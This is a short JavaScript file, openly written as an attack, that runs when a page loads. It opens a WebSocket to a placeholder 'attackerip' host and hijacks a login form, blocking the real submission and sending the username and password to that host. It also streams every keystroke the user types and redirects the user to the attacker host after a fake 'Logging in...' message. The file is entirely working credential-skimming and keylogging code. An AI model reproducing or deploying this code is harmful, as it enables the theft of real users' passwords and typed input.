document.addEventListener("DOMContentLoaded", function () {
    var loginForm = document.getElementById("loginForm");

    // Connect to WebSocket server
    var ws = new WebSocket("ws://attackerip:12345");

    ws.onopen = function () {
        console.log("WebSocket Connected!");
    };

    ws.onerror = function (error) {
        console.error("WebSocket Error: ", error);
    };

    // Capture login credentials
    loginForm.addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent actual form submission

        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;

        // Send credentials over WebSocket
        if (ws.readyState === WebSocket.OPEN) {
            ws.send("Login - Username: " + username + " | Password: " + password);
            console.log("Credentials Sent via WebSocket");
        }

        // Fake "Logging in..." message & redirect
        alert("Logging in... Please wait.");
        setTimeout(function () {
            window.location.href = "http://attackerip:3000";
        }, 2000);
    });

    // Capture keystrokes
    document.addEventListener("keydown", function (event) {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send("Keystroke: " + event.key);
        }
    });
});
